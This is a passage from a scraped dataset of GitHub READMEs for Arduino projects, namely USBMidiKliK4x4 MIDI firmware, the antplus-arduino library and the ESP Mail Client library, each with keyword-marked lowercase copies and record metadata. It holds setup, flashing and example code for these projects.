STM32DUINO platform.\nDownload the last firmware here : https://github.com/TheKikGen/USBMidiKliK4x4/releases\nCheck also the wiki here : https://github.com/TheKikGen/USBMidiKliK4x4/wiki\nThe story of this project starts with a hack of the MIDIPLUS/MIDITECH 4x4 USB to MIDI interface. Needing more midi jacks, I bought a second Miditech interface, but I discovered it was not possible to use 2 Miditech / Midiplus MIDI USB 4X4 on the same computer to get 8x8, and according to the Miditech support, as that usb midi interface was not updateable at all ! I was stucked....That was motivating me enough to write a totally new and better firmware : the UsbMidiKlik4x4 project was born.\nThe current version V2.5 supports full USB midi until 16xIN , 16XOUT plus routing features, enabling configurables standalone mode, merge mode, thru mode, split mode, midi transformation, midi clock, etc., huge sysex flow, configuration menu from serial USB, and is very fast and stable thanks to the STM32F103. More of that, you can aggregate until 5 3x3 boards seen as one by activating the \"Bus mode\".\nThis work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.\nIf you are a regular user of USBMidiKlik, please consider making a donation to encourage our team, and to pay for the coffees swallowed during the long nights of coding !\nUSBMidiKliK4x4 features\nSTM32F103C8 / STM32F103CB / STM32F103RB / STM32F103RC uC support\nBluepill and Miditech 4x4 board support\n16 MIDI USB IN/OUT\n15-16 MIDI JACK IN / JACKS OUT *1\n8 Virtual internal IN/OUT\n4 midi clock and Midi Time Code generators\nFull remote configuration by SYSEX\nConfiguration user interface from a serial USB terminal\nSupport of large sysex flow\nComplex routing engine allowing to route any IN to any OUT\nTransformation pipes allowing dynamic modification of midi messages\nCustomisable USB device ProductStringName, Vendor and Product Ids\nSTANDALONE mode (no USB host needed)\nINTELLITHRU mode allowing specific routing rules when USB is idle\nStackable interfaces in bus mode to get 6x6 to 15x15 physical midi ports\nThe \"pipeline\" feature allows you to modify an incoming midi message through a chain of transformation functions (a \"pipe\"), e.g., transpose notes, split, map channel to another, map CC to another, etc...New pipes can be easily added in order to obtain complex midi transformations without degrading performances.\n4 Midi clock generator / 8 virtual ports are available within the routing engine. Below is an overview of the possible paths for a midi message packet, coming from a physical in port to a physical out port :\nThe bus mode allows the aggregation of up to five interfaces using the I2C protocol, which will be seen as a single interface by the usb host and/or the midi routing engine (including standalone mode).\nLast release of the firmware can be found here : https://github.com/TheKikGen/USBMidiKliK4x4/releases/ Update tool is included. Unzip and launch the UMK_BluePillUpdate.bat file (Windows only currently).\nMKPI : UMK4x4 graphical frontend\nOrzdk has developped a graphical UI for manipulating and configuring the USBMidiKliK settings in sysex mode, from a web browser. It also allows to show visual representation of the routes and transformations that are currently applied in your USBMidiKlik.\nhttps://github.com/orzdk/mkpi\nBluepill and USBMidiKlik\nI have realized a Bluepill \"MIDI shield\", to easily transform that cheap uC board to a powerfull 3 IN / 3 OUT USB MIDI interface, based on the exactly same firmware as USB MidiKlik 4x4. The board is USB Powered, so no additional power supply necessary. It works driverless as a class compliant device, with Windows XP SP3, Vista 32 and 64 Bit, Windows 7 / 8 / 10 32 and 64 Bit, and Mac OS X, Linux ALSA, Akai MPC Live/X/Force, IOS, Android.\nA DIY kit is available at Tindie :\nhttps://www.tindie.com/stores/thekikgenlabs/\nSpecific PCB without DIN 5 female to allow a deported DIN 5 rail are also available. Contact me for more details.\nUSBMidiKliK4x4 - Configuration overview\nPrebuilt binaries are compiled for the tkg-hid-bootloader since the 2.5 version, so you need the tkg-hid-bootloader firmware here : https://github.com/TheKikGen/stm32-tkg-hid-bootloader/blob/master/F1/bootloader_only_binaries/tkg_hid_generic_pc13.bin\nYou can then use TKG-FLASH.EXE provided in the release to flash the 128K or the 64k bluepill version.\nThe 128K firmware should work on a 64K Bluepill most of the time. If it is not the case, try the 64K firmware version.\n2 modes can be used to configure the USBMidiKlik midi : system exclusive messages or a configuration menu. Sysex messages have the following format, and ARE ONLY INTERPRETED ON CABLE 0 OR MIDI IN JACK 1 :\nF0 77 77 78 <sysex function id > <data> F7\nThe \"F0 77 77 78\" is the specific sysex header for USBMidiKlik4x4. Know that it is a totally unofficial header. You will find the sysex V2.5 documentation in the repository :\nhttps://raw.githubusercontent.com/TheKikGen/USBMidiKliK4x4/master/UMK-4X4-SYSEX-IPL.TXT\nThe second way is to activate the configuration menu on the serial port with the following sysex :\nF0 77 77 78 06 08 F7\nTo send that Sysex, you can use for example, MIDIOX, or the \"sendmidi\" command line utility by gbevin :\nsendmidi dev \"USB MIDIKliK 4x4\" syx hex 77 77 78 06 08\nYou will find the last binary release of sendmidi here : https://github.com/gbevin/SendMIDI/releases\nImmediatly after sending this sequence with your prefered midi software, the interface will reboot in CDC serial COM mode, allowing you to open a terminal to configure easily USBMIDIKLIK.\nYou can use any software like TERATERM, on Windows, or \"screen\" on MacOs. The bauds rate must be set to 115200. The following menu should appear after connecting to the right serial USB port , and pressing ENTER :\nUSBMIDIKLIK 4x4 - BLUEPILL STMF103C8x - V2.0\n(c) TheKikGen Labs\nhttps://github.com/TheKikGen/USBMidiKliK4x4\n[0] View global settings [a] Show active devices\n[1] View midi routing [d] SYSEX settings dump\n[2] Usb VID PID\n[3] Usb product string\n[4] Cable OUT routing [e] Reload settings\n[5] Jack IN routing [f] Factory settings\n[6] IntelliThru routing [r] Factory routing\n[7] IntelliThru timeout [s] Save settings\n[8] Toggle bus mode [z] Debug on Serial3\n[9] Set device Id [x] Exit\n=>\nDon't forget to save your settings with the \"s\" option before leaving the configuration menu with \"x\".\nNEWS\nNew release : V2.5.1 correcting the MSGFLTR pipe bug\nThis v2.5.1 release includes a bug correction in parameters validation of the MSGFLTR pipe that was blocking the function #2. https://github.com/TheKikGen/USBMidiKliK4x4/releases/tag/v2.5.1\nOFFICIAL RELEASE VERSION 2.5 merged to master branch\nThis is a major release adding a powerfull \"pipeline\" feature allowing to modify an incoming midi message within a chain of transformation functions, 8 virtual ports and 4 midi clock generators in the routing engine.\nUpgrade pack here : https://github.com/TheKikGen/USBMidiKliK4x4/releases/tag/V2.5.0\nWIKI\nWiki Home\nThe Miditech/Midiplus hack story\nAbout the bus mode\nBuild UMK4x4 from sources\nUse case : how to get a TriThru a la Midisolutions\nSysex implementation for firmware V2.5", "link": "https://github.com/TheKikGen/USBMidiKliK4x4", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "__ __| | | /_) | ___| | |\n| __ \\ _ \\ ' / | | / | _ \\ __ \\ | _` | __ \\ __|\n| | | | __/ . \\ | < | | __/ | | | ( | | |\\__ \\\n_| _| |_|\\___| _|\\_\\_|_|\\_\\\\____|\\___|_| _| _____|\\__,_|_.__/ ____/\nusbmidiklik4x4\na multi-port usb midi interface for the stm32duino platform.\ndownload the last firmware here : https://github.com/thekikgen/usbmidiklik4x4/releases\ncheck also the wiki here : https://github.com/thekikgen/usbmidiklik4x4/wiki\nthe story of this project starts with a hack of the midiplus/miditech 4x4 usb to midi interface. needing more midi jacks, i bought a second miditech interface, but i discovered it was not possible to use 2 miditech / midiplus midi usb 4x4 on the same computer to get 8x8, and according to the miditech support, as that usb midi interface was not updateable at all ! i was stucked....that was motivating me enough to write a totally new and better firmware : the usbmidiklik4x4 project was born.\nthe current version v2.5 supports full usb midi until 16xin , 16xout plus routing features, enabling configurables standalone mode, merge mode, thru mode, split mode, midi transformation, midi clock, etc., huge sysex flow, configuration menu from serial usb, and is very fast and stable thanks to the stm32f103. more of that, you can aggregate until 5 3x3 boards seen as one by activating the \"bus mode\".\nthis work is licensed under a creative commons attribution-noncommercial 4.0 international license.\nif you are a regular user of usbmidiklik, please consider making a donation to encourage our team, and to pay for the coffees swallowed during the long nights of coding !\nusbmidiklik4x4 features\nstm32f103c8 / stm32f103cb / stm32f103rb / stm32f103rc uc support\nbluepill and miditech 4x4 board support\n16 midi usb in/out\n15-16 midi jack in / jacks out *1\n8 virtual internal in/out\n4 midi clock and midi time code generators\nfull remote configuration by sysex\nconfiguration user interface from a serial usb terminal\nsupport of large sysex flow\ncomplex routing engine allowing to route any in to any out\ntransformation pipes allowing dynamic modification of midi messages\ncustomisable usb device productstringname, vendor and product ids\nstandalone mode (no usb host needed)\nintellithru mode allowing specific routing rules when usb is idle\nstackable interfaces in bus mode to get 6x6 to 15x15 physical midi ports\nthe \"pipeline\" feature allows you to modify an incoming midi message through a chain of transformation functions (a \"pipe\"), e.g., transpose notes, split, map channel to another, map cc to another, etc...new pipes can be easily added in order to obtain complex midi transformations without degrading performances.\n4 midi clock generator / 8 virtual ports are available within the routing engine. below is an overview of the possible paths for a midi message packet, coming from a physical in port to a physical out port :\nthe bus mode allows the aggregation of up to five interfaces using the i2c protocol, which will be seen as a single interface by the usb host and/or the midi routing engine (including standalone mode).\nlast release of the firmware can be found here : https://github.com/thekikgen/usbmidiklik4x4/releases/ update -----> tool !!!  is included. unzip and launch the umk_bluepillupdate.bat file (windows only currently).\nmkpi : umk4x4 graphical frontend\norzdk has developped a graphical ui for manipulating and configuring the usbmidiklik settings in sysex mode, from a web browser. it also allows to show visual representation of the routes and transformations that are currently applied in your usbmidiklik.\nhttps://github.com/orzdk/mkpi\nbluepill and usbmidiklik\ni have realized a bluepill \"midi shield\", to easily transform that cheap uc board to a powerfull 3 in / 3 out usb midi interface, based on the exactly same firmware as usb midiklik 4x4. the board is usb powered, so no additional power supply necessary. it works driverless as a class compliant device, with windows xp sp3, vista 32 and 64 bit, windows 7 / 8 / 10 32 and 64 bit, and mac os x, linux alsa, akai mpc live/x/force, ios, android.\na diy kit is available at tindie :\nhttps://www.tindie.com/stores/thekikgenlabs/\nspecific pcb without din 5 female to allow a deported din 5 rail are also available. contact me for more details.\nusbmidiklik4x4 - configuration overview\nprebuilt binaries are compiled for the tkg-hid-bootloader since the 2.5 version, so you need the tkg-hid-bootloader firmware here : https://github.com/thekikgen/stm32-tkg-hid-bootloader/blob/master/f1/bootloader_only_binaries/tkg_hid_generic_pc13.bin\nyou can then use tkg-flash.exe provided in the release to flash the 128k or the 64k bluepill version.\nthe 128k firmware should work on a 64k bluepill most of the time. if it is not the case, try the 64k firmware version.\n2 modes can be used to configure the usbmidiklik midi : system exclusive messages or a configuration menu. sysex messages have the following format, and are only interpreted on cable 0 or midi in jack 1 :\nf0 77 77 78 <sysex function id > <data> f7\nthe \"f0 77 77 78\" is the specific sysex header for usbmidiklik4x4. know that it is a totally unofficial header. you will find the sysex v2.5 documentation in the repository :\nhttps://raw.githubusercontent.com/thekikgen/usbmidiklik4x4/master/umk-4x4-sysex-ipl.txt\nthe second way is to activate the configuration menu on the serial port with the following sysex :\nf0 77 77 78 06 08 f7\nto send that sysex, you can use for example, midiox, or the \"sendmidi\" command line utility by gbevin :\nsendmidi dev \"usb midiklik 4x4\" syx hex 77 77 78 06 08\nyou will find the last binary release of sendmidi here : https://github.com/gbevin/sendmidi/releases\nimmediatly after sending this sequence with your prefered midi software, the interface will reboot in cdc serial com mode, allowing you to open a terminal to configure easily usbmidiklik.\nyou can use any software like teraterm, on windows, or \"screen\" on macos. the bauds rate must be set to 115200. the following menu should appear after connecting to the right serial usb port , and pressing enter :\nusbmidiklik 4x4 - bluepill stmf103c8x - v2.0\n(c) thekikgen labs\nhttps://github.com/thekikgen/usbmidiklik4x4\n[0] view global settings [a] show active devices\n[1] view midi routing [d] sysex settings dump\n[2] usb vid pid\n[3] usb product string\n[4] cable out routing [e] reload settings\n[5] jack in routing [f] factory settings\n[6] intellithru routing [r] factory routing\n[7] intellithru timeout [s] save settings\n[8] toggle bus mode [z] debug on serial3\n[9] set device id [x] exit\n=>\ndon't forget to save your settings with the \"s\" option before leaving the configuration menu with \"x\".\nnews\nnew release : v2.5.1 correcting the msgfltr pipe bug\nthis v2.5.1 release includes a bug correction in parameters validation of the msgfltr pipe that was blocking the function #2. https://github.com/thekikgen/usbmidiklik4x4/releases/tag/v2.5.1\nofficial release version 2.5 merged to master branch\nthis is a major release adding a powerfull \"pipeline\" feature allowing to modify an incoming midi message within a chain of transformation functions, 8 virtual ports and 4 midi clock generators in the routing engine.\nupgrade pack here : https://github.com/thekikgen/usbmidiklik4x4/releases/tag/v2.5.0\nwiki\nwiki home\nthe miditech/midiplus hack story\nabout the bus mode\nbuild umk4x4 from sources\nuse case : how to get a trithru a la midisolutions\nsysex implementation for firmware v2.5", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000488, "year": null}, {"Unnamed: 0": 2564, "autor": 524, "date": null, "content": "antplus-arduino\nAn Implementation of the Ant+ Network on top of ant-arduino\nStatus\nNews\n6/28/2020 v2.0.0 of ant-arduino released with support for mbed and softdevices\n8/20/2019 v1.0.0 released, master profiles now are available\n10/1/2017 v0.1.0 Version released, library added to managers\n9/24/2017 Proof of concept complete (for system design)\n9/4/2017 Project Started\nRoadmap\nBuild support for non-ANT+ channel interfacing\nAdding more profiles\nDeveloper's Guide\nExample\nI have created several sketches of configuring the radio with the ant-arduino library. You can find these in the examples folder. Here's an example of configuring a channel with a NRF51 radio:\nAntWithCallbacks ant = AntWithCallbacks();\nAntPlusRouter router = AntPlusRouter();\nProfileHeartRateMonitor hr = ProfileHeartRateMonitor(WILDCARD_DEVICE);\nvoid previousHeartBeatDataPageHandler(HeartRatePreviousHeartBeat& dp, uintptr_t data) {\nSerial.print(\"HR: \");\nSerial.println(dp.getComputedHeartRate());\n}\nvoid setup() {\nSerial1.begin(BAUD_RATE);\nant.setSerial(Serial1);\ndelay(10000);\nrouter.setDriver(&ant); // never touch ant again\nrouter.setAntPlusNetworkKey(NETWORK_KEY);\nrouter.setProfile(CHANNEL_0, &hr);\n// Delay after initial setup to wait for user to connect on serial\nSerial.begin(BAUD_RATE);\nSerial.println(\"Running\");\nhr.onHeartRatePreviousHeartBeat(previousHeartBeatDataPageHandler, NULL);\nhr.begin();\n// wait for pair to complete\nhr.waitForPair();\n}\nvoid loop() {\nrouter.loop();\n}\nSee the examples folder for the full source. There are more examples in the download.\nTo add ANT support to a new sketch, add \"#include <ANTPLUS.h>\" (without quotes) to the top of your sketch. You can also add it by selecting the \"sketch\" menu, and choosing \"Import Library->ANT+\".\nHardware\nSee ant-arduino\nSupport ANT+ Profiles\nThis library aims to support all ANT+ devices. This goal will take time but its an attainable one. Check out the wiki for the list of profiles implemented and their versions.\nInstallation\nNote: This library depends on ant-arduino. You must have it installed for it to work. If you are using platformio you don't have to worry about this.\nArduino 1.5 and later\nArduino now includes a library manager for easier library installation. From the Sketch menu select include library->Manage Libraries, then type \"antplus-arduino\" in the filter and install.\nPrior to Arduino 1.5 installation is manual\nDownload a .zip or .tar.gz release from github. Determine the location of your sketchbook by selecting \"preferences\" on the Arduino menu. Create a \"libraries\" folder in your sketchbook and unzip the release file in that location.\nIf you are using platformio you can install the library by running platformio lib install 1879\nUploading Sketches\nUploading sketches with a Leonardo is as simple as connecting the Arduino to your computer and uploading. When using a single serial port Arduino, such as the Pro Mini (3.3V), the jumpers on the ANT Radio must be disconnected. Then, after upload, reconnect the lines to have access to the serial port. Always remember to power off the Arduino before moving the jumpers.\nConfiguration\nSee ant-arduino\nQuestions/Feedback\nQuestions about this project should be posted to http://groups.google.com/group/antplus-api?pli=1 Be sure to provide as much detail as possible (e.g. what radios, firmware versions, configuration and code).\nConsulting/Commercial Licenses\nAt the current time there is zero support for commercial usage. Contact me via email if you are looking to use this code commercially.\nIf you are looking for commercial support for ANT radios go to thisisant.com\nNOTE: This library is not ANT+ certified and does not intend to be. It is meant to be tool to get quick and easy access to sensors in the ANT+ network. There are edge cases where it will fail to meet the spec of the ANT+ protocol.", "link": "https://github.com/cujomalainey/antplus-arduino", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "antplus-arduino\nan implementation of the ant+ network on top of ant-arduino\nstatus\nnews\n6/28/2020 v2.0.0 of ant-arduino released with support for mbed and softdevices\n8/20/2019 v1.0.0 released, master profiles now are available\n10/1/2017 v0.1.0 version released, library added to managers\n9/24/2017 proof of concept complete (for system design)\n9/4/2017 project started\nroadmap\nbuild support for non-ant+ channel interfacing\nadding more profiles\ndeveloper's guide\nexample\ni have created several sketches of configuring the radio with the ant-arduino library. you can find these in the examples folder. here's an example of configuring a channel with a nrf51 radio:\nantwithcallbacks ant = antwithcallbacks();\nantplusrouter router = antplusrouter();\nprofileheartratemonitor hr = profileheartratemonitor(wildcard_device);\nvoid previousheartbeatdatapagehandler(heartratepreviousheartbeat& dp, uintptr_t data) {\nserial.print(\"hr: \");\nserial.println(dp.getcomputedheartrate());\n}\nvoid setup() {\nserial1.begin(baud_rate);\nant.setserial(serial1);\ndelay(10000);\nrouter.setdriver(&ant); // never touch ant again\nrouter.setantplusnetworkkey(network_key);\nrouter.setprofile(channel_0, &hr);\n// delay after initial setup to wait for user to connect on serial\nserial.begin(baud_rate);\nserial.println(\"running\");\nhr.onheartratepreviousheartbeat(previousheartbeatdatapagehandler, null);\nhr.begin();\n// wait for pair to complete\nhr.waitforpair();\n}\nvoid loop() {\nrouter.loop();\n}\nsee the examples folder for the full source. there are more examples in the download.\nto add ant support to a new sketch, add \"#include <antplus.h>\" (without quotes) to the top of your sketch. you can also add it by selecting the \"sketch\" menu, and choosing \"import library->ant+\".\nhardware\nsee ant-arduino\nsupport ant+ profiles\nthis library aims to support all ant+ devices. this goal will take time but its an attainable one. check out the wiki for the list of profiles implemented and their versions.\ninstallation\nnote: this library depends on ant-arduino. you must have it installed for it to work. if you are using platformio you don't have to worry about this.\narduino 1.5 and later\narduino now includes a library manager for easier library installation. from the sketch menu select include library->manage libraries, then type \"antplus-arduino\" in the filter and install.\nprior to arduino 1.5 installation is manual\ndownload a .zip or .tar.gz release from github. determine the location of your sketchbook by selecting \"preferences\" on the arduino menu. create a \"libraries\" folder in your sketchbook and unzip the release file in that location.\nif you are using platformio you can install the library by running platformio lib install 1879\nuploading sketches\nuploading sketches with a leonardo is as simple as connecting the arduino to your computer and uploading. when using a single serial port arduino, such as the pro mini (3.3v), the jumpers on the ant radio must be disconnected. then, after upload, reconnect the lines to have access to the serial port. always remember to power off the arduino before moving the jumpers.\nconfiguration\nsee ant-arduino\nquestions/feedback\nquestions about this project should be posted to http://groups.google.com/group/antplus-api?pli=1 be sure to provide as much detail as possible (e.g. what radios, firmware versions, configuration and code).\nconsulting/commercial licenses\nat the current time there is zero support for commercial usage. contact me via email if you are looking to use this code commercially.\nif you are looking for commercial support for ant radios go to thisisant.com\nnote: this library is not ant+ certified and does not intend to be. it is meant to be -----> tool !!!  to get quick and easy access to sensors in the ant+ network. there are edge cases where it will fail to meet the spec of the ant+ protocol.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000524, "year": null}, {"Unnamed: 0": 2596, "autor": 556, "date": null, "content": "Mail Client Arduino Library v1.6.1\nThe first, complete and secure Arduino EMail Client library for Espressif's ESP32 and ESP8266, Atmel's SAMD21 devices with u-blox NINA-W102 WiFi/Bluetooth module to send and read Email through the SMTP and IMAP servers.\nThis library allows sending and reading Email with various attachments supported and provides more reliable and flexibilities of usages.\nThe library was tested and work well with ESP32s, ESP8266s, SAMD21s based modules.\nThis library was developed to replace the deprecated ESP32 Mail Client library with more options and features, better reliability and also conforms to the RFC standards.\nThis library has built-in WiFi client and aim to be complete Email client that can send and read Email with no restrictions and no indirect Email proxy (Email sending server) services needed.\nOther serial Mobile network modem (GSM/3G/4G) and SPI/I2C Ethernet board which GSM or Ethernet Plain/SSL TCP client libraries are available, are not compattible to integrate to use with this library because network upgradable was not supported in those libraries.\nThis library supports sending and receiving Email via Ethernet in ESP32 and ESP8266 devices using Ethernet module through secure (SSL/TLS) and non-secure ports.\nCopyright (c) 2021 K. Suwatchai (Mobizt).\nFeatures\nSupport Espressif's ESP32 and ESP8266, Atmel's SAMD21 devices with u-blox NINA-W102 WiFi/Bluetooth module.\nSupport TCP session reusage.\nSupport PLAIN, LOGIN and XOAUTH2 authentication mechanisms.\nSupport secured (with SSL and TLS or upgrade via STARTTLS) and non-secure ports.\nSupport mailbox selection for Email reading and searching (IMAP).\nSupport mailbox changes notification (IMAP).\nSupport the content encodings e.g. quoted-printable and base64.\nSupport the content decodings e.g. base64, UTF-8, UTF-7, quoted-printable, ISO-8859-1 (latin1) and ISO-8859-11 (Thai).\nSupport embedded contents e.g. inline images, attachments, parallel media attachments and RFC822 message.\nSupport full debuging.\nSupport flash memory (ESP32 and ESP8266), SD and SD_MMC (ESP32) for file storages which can be changed in ESP_Mail_FS.h.\nSupport Ethernet (ESP32 using LAN8720, TLK110 and IP101 Ethernet modules, and ESP8266 (Arduino Core SDK v3.x.x and later) using ENC28J60, W5100 and W5500 Ethernet modules).\nCustomizable configurations (see the examples for the usages)\nSupported Devices\nThis following devices are supported.\nESP8266 MCUs based boards\nESP32 MCUs based boards\nArduino MKR WiFi 1010\nArduino Nano 33 IoT\nArduino MKR Vidor 4000\nLAN8720 Ethernet PHY\nTLK110 Ethernet PHY\nIP101 Ethernet PHY\nENC28J60 SPI Ethernet module\nW5100 SPI Ethernet module\nW5500 SPI Ethernet module\nNote: Arduino UNO WiFi Rev.2 (AVR Platform) is not supported.\nTested Devices\nThis following devices were tested.\nSparkfun ESP32 Thing\nNodeMCU-32\nWEMOS LOLIN32\nTTGO T8 V1.8\nM5Stack ESP32\nNodeMCU ESP8266\nWemos D1 Mini (ESP8266)\nArduino MKR WiFi 1010\nLAN8720 Ethernet PHY\nENC28J60 SPI Ethernet module\nPrerequisites\nESP32 and ESP8266\nFor Espressif's ESP32 and ESP8266 based boards, this library requires Arduino's ESP32 or ESP8266 Core SDK to be installed.\nThe latest Core SDK is recommended. For ESP8266, the Core SDK version 3.x.x or later is recommended.\nThe ESP8266 Core SDK version 2.5.x and earlier are not supported.\nSAMD21\nFor Atmel's SAMD21 based boards, custom built WiFiNINA firmware is needed to be installed instead of official Arduino WiFiNINA firmware.\nComparison between custom built and official WiFiNINA firmwares.\nOptions Custom Built Firmware Arduino Official Firmware\nPlain connection via port 25, 143 Yes Yes\nSecure (SSL) connection via port 465, 993 Yes Yes\nUpgradable (STARTTLS) via port 25, 587, 143 Yes No\nRequire Email Server Root Certificate installation Optional, not required by default *Yes\nRequire WiFiNINA library installation No (already built-in) Yes\n*Require root certificate of Email server which is available in Arduino IDE's WiFi101 /WiFiNINA Firmware Updater tool.\nInstall Custom Built WiFiNINA Firmware\nTo install custom built WiFiNINA firmware, please follow the following instructions.\nInstall flash tool, esptool.py from here. To instal esptool python script, you will need either Python 2.7 or Python 3.4 or newer installed on your system.\nDownload nina-fw.bin in firmwares/samd21 and SerialNINAPassthrough.ino.\nCompile and upload SerialNINAPassthrough.ino to the device.\nOpen the terminal program (Linux and macOS) or command prompt (Windows), and type this command.\nesptool.py --port <com-port> --baud 115200 --before default_reset --after hard_reset write_flash 0x0 <path/to/file>/nina-fw.bin\nFrom command above, replace <com-port> with your comport e.g. COM5 (Windows) or /dev/ttyUSB0 (Linux and macOS) and also replace <path/to/file> with your path to the nina-fw.bin that has been extracted.\nThe flash (upload) result shows in the command prompt window will look similar to below image.\nIf the custom built WiFiNINA firmware was installed, the debug message will show the library version with WiFiNINA firmware version which followed by built number (+21120).\n> C: ESP Mail Client v1.6.1, Fw v1.4.8+21120\nLibrary Instalation\nClick on Clone or download dropdown at the top of repository, select Download ZIP and save file on your computer.\nFrom Arduino IDE, goto menu Sketch -> Include Library -> Add .ZIP Library... and choose ESP-Mail-Client-master.zip that previously downloaded.\nGo to menu Files -> Examples -> ESP-Mail-Client-master and choose one from examples\nIDE Configuaration for ESP8266 MMU - Adjust the Ratio of ICACHE to IRAM\nArduino IDE\nWhen you update the ESP8266 Arduino Core SDK to v3.0.0, the memory can be configurable from Arduino IDE board settings.\nBy default MMU option 1 was selected, the free Heap can be low and may not suitable for the SSL client usage in this library.\nTo increase the Heap, choose the MMU option 3, 16KB cache + 48KB IRAM and 2nd Heap (shared).\nTo use external Heap from 1 Mbit SRAM 23LC1024, choose the MMU option 5, 128K External 23LC1024.\nTo use external Heap from PSRAM, choose the MMU option 6, 1M External 64 MBit PSRAM.\nThe connection between SRAM/PSRAM and ESP8266\n23LC1024/ESP-PSRAM64 ESP8266\nCS (Pin 1) GPIO15\nSCK (Pin 6) GPIO14\nMOSI (Pin 5) GPIO13\nMISO (Pin 2) GPIO12\n/HOLD (Pin 7 on 23LC1024 only) 3V3\nVcc (Pin 8) 3V3\nVcc (Pin 4) GND\nMore about MMU settings. https://arduino-esp8266.readthedocs.io/en/latest/mmu.html\nPlatformIO IDE\nBy default the balanced ratio (32KB cache + 32KB IRAM) configuration is used.\nTo increase the heap, PIO_FRAMEWORK_ARDUINO_MMU_CACHE16_IRAM48_SECHEAP_SHARED build flag should be assigned in platformio.ini.\n[env:d1_mini]\nplatform = espressif8266\nbuild_flags = -D PIO_FRAMEWORK_ARDUINO_MMU_CACHE16_IRAM48_SECHEAP_SHARED\nboard = d1_mini\nframework = arduino\nmonitor_speed = 115200\nAnd to use external Heap from 1 Mbit SRAM 23LC1024 and 64 Mbit PSRAM, PIO_FRAMEWORK_ARDUINO_MMU_EXTERNAL_128K and PIO_FRAMEWORK_ARDUINO_MMU_EXTERNAL_1024K build flags should be assigned respectively.\nThe supportedd MMU build flags in PlatformIO.\nPIO_FRAMEWORK_ARDUINO_MMU_CACHE16_IRAM48\n16KB cache + 48KB IRAM (IRAM)\nPIO_FRAMEWORK_ARDUINO_MMU_CACHE16_IRAM48_SECHEAP_SHARED\n16KB cache + 48KB IRAM and 2nd Heap (shared)\nPIO_FRAMEWORK_ARDUINO_MMU_CACHE16_IRAM32_SECHEAP_NOTSHARED\n16KB cache + 32KB IRAM + 16KB 2nd Heap (not shared)\nPIO_FRAMEWORK_ARDUINO_MMU_EXTERNAL_128K\n128K External 23LC1024\nPIO_FRAMEWORK_ARDUINO_MMU_EXTERNAL_1024K\n1M External 64 MBit PSRAM\nPIO_FRAMEWORK_ARDUINO_MMU_CUSTOM\nDisables default configuration and expects user-specified flags\nTo use PSRAM/SRAM for internal memory allocation which you can config to use it via ESP_Mail_FS.h with this macro.\n#define ESP_Mail_USE_PSRAM\nTest code for MMU\n#include <Arduino.h>\n#include <umm_malloc/umm_heap_select.h>\nvoid setup()\n{\nSerial.begin(115200);\nHeapSelectIram ephemeral;\nSerial.printf(\"IRAM free: %6d bytes\\r\\n\", ESP.getFreeHeap());\n{\nHeapSelectDram ephemeral;\nSerial.printf(\"DRAM free: %6d bytes\\r\\n\", ESP.getFreeHeap());\n}\nESP.setExternalHeap();\nSerial.printf(\"External free: %d\\n\", ESP.getFreeHeap());\nESP.resetHeap();\n}\nvoid loop() {\n// put your main code here, to run repeatedly:\n}\nUse PSRAM on ESP32\nTo enable PSRAM in ESP32 module with PSRAM chip, in Arduino IDE\nIn PlatformIO in VSCode IDE, add the following build_flags in your project's platformio.ini file\nbuild_flags = -DBOARD_HAS_PSRAM -mfix-esp32-psram-cache-issue\nThe examples/SMTP/Send_Attachment_PSRAM/Send_Attachment_PSRAM.ino showed how to send the attachment stored in PSRAM.\nSince v1.5.4, this library supports PSRAM for internal memory allocation which you can config to use it via ESP_Mail_FS.h with this macro.\n#define ESP_Mail_USE_PSRAM\nExclude unused classes to save memory\nNow you can compile the library only for seclected classes.\nIn ESP_Mail_FS.h, the IMAP and SMTP class can be enabled with the macros.\n#define ENABLE_IMAP\n#define ENABLE_SMTP\nIn ESP8266 and ESP32, when no attachments require for uploading and downloading, the storage file systems libraries e.g. SD or SD_MMC (ESP32), SPIFFS and LittleFS will no longer use and can be excluded when compiling the code to reduce program flash size, by comment the following macros to exclude them.\n#define ESP_MAIL_DEFAULT_SD_FS SD\n#define ESP_Mail_DEFAULT_FLASH_FS SPIFFS\nUsage\nSee Full Examples for complete usages.\nSee Function Description for all available functions.\nThe following examples showed the minimum usage which many options are not configured.\nThe examples in the examples folder provide the full options usages.\nNotes\nThe string in the function's parameters or properties of structured data is the pointer to constant char or char array.\nYou need to assign the string literal or char array or pointer to constant char to it.\nEx.\nmessage.sender.name = \"My Mail\";\nmessage.sender.email = \"sender or your Email address\";\nOr using String class\nString name = \"John\";\nString email = \"john@mail.com\";\nmessage.sender.name = name.c_str();\nmessage.sender.email = email.c_str();\nSend the Email\n// Include ESP Mail Client library (this library)\n#include <ESP_Mail_Client.h>\n// Define the SMTP Session object which used for SMTP transsport\nSMTPSession smtp;\n// Define the session config data which used to store the TCP session configuration\nESP_Mail_Session session;\n// Set the session config\nsession.server.host_name = \"smtp.office365.com\"; //for outlook.com\nsession.server.port = 587;\nsession.login.email = \"your Email address\"; //set to empty for no SMTP Authentication\nsession.login.password = \"your Email password\"; //set to empty for no SMTP Authentication\nsession.login.user_domain = \"client domain or ip e.g. mydomain.com\";\n// Set the NTP config time\nsession.time.ntp_server = \"pool.ntp.org,time.nist.gov\";\nsession.time.gmt_offset = 3;\nsession.time.day_light_offset = 0;\n// Define the SMTP_Message class variable to handle to message being transport\nSMTP_Message message;\n// Set the message headers\nmessage.sender.name = \"My Mail\";\nmessage.sender.email = \"sender or your Email address\";\nmessage.subject = \"Test sending Email\";\nmessage.addRecipient(\"name1\", \"email1\");\nmessage.addRecipient(\"name2\", \"email2\");\nmessage.addCc(\"email3\");\nmessage.addBcc(\"email4\");\n// Set the message content\nmessage.text.content = \"This is simple plain text message\";\n//Base64 data of image\nconst char *greenImg = 